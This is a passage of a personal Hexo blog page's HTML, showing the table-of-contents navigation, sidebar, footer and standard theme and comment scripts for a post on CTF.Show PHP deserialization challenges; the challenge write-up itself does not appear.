class="nav-number">11.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">11.2.</span> <span class="nav-text">非预期解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E3%81%AE%E6%A2%A6"><span class="nav-number">11.3.</span> <span class="nav-text">官方の梦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E5%A4%96%E8%AF%9D"><span class="nav-number">11.4.</span> <span class="nav-text">题外话</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E7%9A%84%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B"><span class="nav-number">11.4.1.</span> <span class="nav-text">HTTP的请求过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="nav-number">11.5.</span> <span class="nav-text">其他问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web261"><span class="nav-number">12.</span> <span class="nav-text">web261</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">12.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-10"><span class="nav-number">12.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web275"><span class="nav-number">13.</span> <span class="nav-text">web275</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web276"><span class="nav-number">14.</span> <span class="nav-text">web276</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-10"><span class="nav-number">14.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE"><span class="nav-number">14.2.</span> <span class="nav-text">关键</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-11"><span class="nav-number">14.3.</span> <span class="nav-text">做法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98-1"><span class="nav-number">14.4.</span> <span class="nav-text">其他问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web267"><span class="nav-number">15.</span> <span class="nav-text">web267</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">15.1.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">15.2.</span> <span class="nav-text">本地环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E6%90%9E"><span class="nav-number">15.3.</span> <span class="nav-text">开搞</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html",
+      identifier: "archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html",
+      title     : "【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
